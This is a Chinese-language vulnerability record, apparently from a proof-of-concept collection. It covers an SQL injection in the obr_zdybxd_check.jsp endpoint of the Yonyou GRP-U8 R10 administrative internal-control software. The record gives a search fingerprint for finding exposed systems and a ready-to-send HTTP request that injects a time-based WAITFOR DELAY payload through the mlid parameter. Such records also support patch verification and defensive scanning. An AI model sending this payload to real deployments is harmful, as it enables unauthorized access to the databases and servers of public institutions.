﻿# 用友GRP-U8 obr_zdybxd_check.jsp SQL注入漏洞

> 更新时间：2024-03-11

> 漏洞编号：

> 漏洞说明：用友GRP-U8R10行政事业内控管理软件在 obr_zdybxd_check.jsp 接口存在潜在的SQL注入漏洞，未经授权的攻击者有可能利用这个漏洞获取对数据库的权限。进一步的攻击可能导致攻击者获取服务器权限，带来严重的安全风险。

> 漏洞特征：app="用友-GRP-U8"

> 验证脚本：HTTP

```
GET /u8qx/obr_zdybxd_check.jsp?mlid=1%27;WAITFOR%20DELAY%20%270:0:10%27-- HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=BB0BCB4EA3F6372CD55E8251E1FFFAD7
Connection: close
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友GRP-U8 obr_zdybxd_check.jsp SQL注入漏洞.poc

